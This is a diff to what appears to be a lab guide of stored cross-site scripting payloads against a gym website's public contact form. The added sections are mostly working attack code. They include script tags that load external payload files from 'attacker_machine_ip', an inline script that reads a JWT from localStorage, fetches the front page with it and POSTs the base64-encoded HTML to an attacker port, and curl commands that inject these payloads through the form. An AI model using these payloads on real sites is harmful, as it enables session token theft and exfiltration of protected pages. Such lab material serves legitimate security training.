@@ -407,14 +407,62 @@ Expected:
 Use this one through the public form:
 
 ```html
-<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-login.js"></script>
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage.js"></script>
 ```
 
 Same-host validation shortcut:
 
 ```html
-<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-login.js"></script>
+<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage.js"></script>
 ```
+
+### Front page request with explicit JWT
+
+This repeats the request to `/`, but now sending the stolen JWT.
+
+Inline reference version:
+
+```html
+<script>
+const token = localStorage.getItem('gym_internal_token');
+fetch('/', {
+  headers: {
+    Authorization: 'Bearer ' + token
+  }
+})
+  .then(r => r.text())
+  .then(html => {
+    const b64 = btoa(unescape(encodeURIComponent(html)));
+    fetch('http://attacker_machine_ip:9000/internal-html', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'text/plain' },
+      body: b64
+    });
+  });
+</script>
+```
+
+This inline version does not fit in the current `250` character `message` field.
+
+### Front page request with explicit JWT via external JavaScript
+
+Use this one through the public form:
+
+```html
+<script src="http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
+```
+
+Same-host validation shortcut:
+
+```html
+<script src="http://docker_host_gateway_ip:8000/tools/payload-frontpage-with-jwt.js"></script>
+```
+
+Expected:
+
+- the returned HTML corresponds to the dashboard
+- the dashboard includes a link to `/admin/messages`
 
 ### Protected dashboard exfiltration with explicit JWT
 
@@ -558,7 +606,17 @@ curl -i -X POST http://cross.fit/contact \
   -d "full_name=Alumno XSS Frontpage JS" \
   -d "email=xss-frontpage-js@example.com" \
   -d "phone=099000013" \
-  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-login.js\"></script>"
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage.js\"></script>"
+```
+
+### Front page request with explicit JWT via external JavaScript
+
+```bash
+curl -i -X POST http://cross.fit/contact \
+  -d "full_name=Alumno XSS Root JWT JS" \
+  -d "email=xss-root-jwt-js@example.com" \
+  -d "phone=099000014" \
+  --data-urlencode "message=<script src=\"http://attacker_machine_ip:8000/tools/payload-frontpage-with-jwt.js\"></script>"
 ```
 
 ### `/admin/messages` exfiltration payload with explicit JWT
